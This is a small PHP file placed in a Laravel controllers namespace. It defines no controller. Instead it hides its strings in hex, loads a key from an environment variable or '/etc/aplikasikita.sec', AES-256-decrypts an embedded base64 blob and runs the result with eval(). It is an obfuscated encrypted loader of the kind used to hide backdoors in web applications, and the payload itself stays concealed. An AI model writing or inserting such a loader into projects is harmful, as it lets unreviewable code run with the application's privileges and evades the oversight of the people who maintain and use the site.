<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gE7fARdecA8L4zPw9HSKtA==');

$c=base64_decode(

'cN1bsMIPENyzq/4d96Cyezi5FcnfNr8cg570HWQEy8V7f3zPBuS2yk/clRB4XCShgMe5isbwawIX' .
'ImTjt2H+ZrpGUoUTJUIAiDKuziehRfgIOzq/i9Eu7MvDn0FK38VhTXzGbwaZMmyrByc5JLTgU+Hy' .
'hSpShQ7+qgEpsBa+UkWksYEvgSLUfUeLsKFKpeOEr0QILEmKFbbpntBXxWTFbh5H1L53+UotqeeU' .
'fCWfDfwOZkuiob/FDhXeUmiEY/y4'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

